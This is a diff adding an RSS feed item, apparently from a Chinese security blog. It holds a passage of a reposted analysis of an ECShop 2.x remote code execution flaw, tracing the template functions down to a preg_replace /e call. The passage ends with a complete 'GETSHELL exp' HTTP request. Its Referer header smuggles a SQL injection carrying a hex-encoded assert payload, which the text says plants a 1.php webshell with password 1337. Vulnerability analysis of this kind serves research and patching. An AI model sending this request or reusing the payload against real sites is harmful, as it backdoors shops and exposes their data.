+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;323&#34;
+		data-flex-basis=&#34;776px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再看fetch函数,传入的参数被fetch_str函数处理了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/16.jpg&#34;
+	width=&#34;654&#34;
+	height=&#34;236&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/16_huc0b39a1e1cafd66afc594a99959e61cb_18607_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/16_huc0b39a1e1cafd66afc594a99959e61cb_18607_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;277&#34;
+		data-flex-basis=&#34;665px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;追踪fetch_str函数，这里的字符串处理流程比较复杂&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/17.jpg&#34;
+	width=&#34;1369&#34;
+	height=&#34;386&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/17_hu955831a958cc500928e150c11a8d55bd_59350_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/17_hu955831a958cc500928e150c11a8d55bd_59350_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;354&#34;
+		data-flex-basis=&#34;851px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/{([^\}\{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;]*)}/e&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;this-&amp;gt;select(&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;1&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&amp;gt;select(‘$asd’)的结果&lt;/p&gt;
+&lt;p&gt;看看select函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/18.jpg&#34;
+	width=&#34;832&#34;
+	height=&#34;416&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/18_hu687e6aba0f99aaca0029fcd3d91b2ef3_23475_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/18_hu687e6aba0f99aaca0029fcd3d91b2ef3_23475_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;200&#34;
+		data-flex-basis=&#34;480px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;第一个字符为$时进入$this-&amp;gt;get_val函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/19.jpg&#34;
+	width=&#34;957&#34;
+	height=&#34;616&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/19_hubb5cc5b6b050abbe80ee481f2aa80f18_44239_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/19_hubb5cc5b6b050abbe80ee481f2aa80f18_44239_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;155&#34;
+		data-flex-basis=&#34;372px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们$val没有.$又进入make_var函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/20.jpg&#34;
+	width=&#34;782&#34;
+	height=&#34;565&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/20_hud46378023c765e62b0fa09490cf811de_36683_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/20_hud46378023c765e62b0fa09490cf811de_36683_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;332px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;最后这里引入单引号从变量中逃逸&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/21.jpg&#34;
+	width=&#34;956&#34;
+	height=&#34;266&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/21_huc35b153634f427ac3af3d6a658a315d8_57653_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/21_huc35b153634f427ac3af3d6a658a315d8_57653_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;359&#34;
+		data-flex-basis=&#34;862px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们要闭合_var所以最终payload是&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$asd&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;];assert(base64_decode(&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//}xxx
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;会在网站跟目录生成1.txt 里面内容是getshell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/vkxkois6/22.jpg&#34;
+	width=&#34;973&#34;
+	height=&#34;411&#34;
+	srcset=&#34;https://360rce.github.io/p/vkxkois6/22_hu2bf2d78b9877217a7976aa990e7e33b8_80695_480x0_resize_q75_box.jpg 480w, https://360rce.github.io/p/vkxkois6/22_hu2bf2d78b9877217a7976aa990e7e33b8_80695_1024x0_resize_q75_box.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ecshop2.x代码执行&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;236&#34;
+		data-flex-basis=&#34;568px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;GETSHELL exp:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;/user.php?act=login&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;127.0.0.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&amp;#34;num&amp;#34;;s:280:&amp;#34;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:3:&amp;#34;&amp;#39;/*&amp;#34;;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;会在网站根目录生成1.php 密码是1337&lt;/p&gt;
+&lt;p&gt;文章转载自:
+&lt;a class=&#34;link&#34; href=&#34;http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/&lt;/a&gt;&lt;/p&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
